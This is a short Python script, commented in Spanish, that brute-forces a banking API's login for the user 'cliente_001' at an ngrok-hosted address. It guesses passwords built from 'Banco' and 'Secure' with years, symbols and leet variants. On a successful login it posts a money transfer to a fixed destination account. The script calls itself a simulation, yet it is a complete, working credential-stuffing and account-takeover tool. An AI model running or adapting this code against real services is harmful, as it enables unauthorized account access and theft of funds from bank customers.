import requests
import time

# 1. URL Base y Endpoints de la API
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"
LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"

TARGET_USER = "cliente_001"

# Cabeceras requeridas para omitir la pantalla de aviso de ngrok
HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# Generación heurística de contraseñas candidatas
CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    candidates = generate_passwords()
    print(f"🤖 [BOT API] Iniciando simulación directa contra {API_BASE}")
    print(f"🔑 Evaluando {len(candidates)} variaciones de contraseña...\n")

    for attempt, pwd in enumerate(candidates, 1):
        # Payload para /api/v1/auth/login
        login_payload = {
            "username": TARGET_USER,
            "password": pwd
        }

        try:
            # Petición HTTP POST de Login
            response = requests.post(
                LOGIN_URL, 
                json=login_payload, 
                headers=HEADERS, 
                timeout=5
            )

            if response.status_code == 200:
                print(f"✅ [Intento {attempt}] ¡Acceso concedido! Contraseña: '{pwd}'")
                print(f"   Respuesta del backend: {response.json()}\n")

                # Ejemplo de petición HTTP POST a /api/v1/transactions/transfer
                transfer_payload = {
                    "destination_account": "ACC-998877",
                    "amount": 150.00
                }
                tx_resp = requests.post(
                    TRANSFER_URL, 
                    json=transfer_payload, 
                    headers=HEADERS, 
                    timeout=5
                )
                print(f"💸 Estado de simulación de transferencia: HTTP {tx_resp.status_code}")
                return

            else:
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> Probad: '{pwd}'")

        except Exception as e:
            print(f"⚠️ Error de conexión en intento {attempt}: {e}")

        time.sleep(0.4)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

if __name__ == "__main__":
    run_api_bot()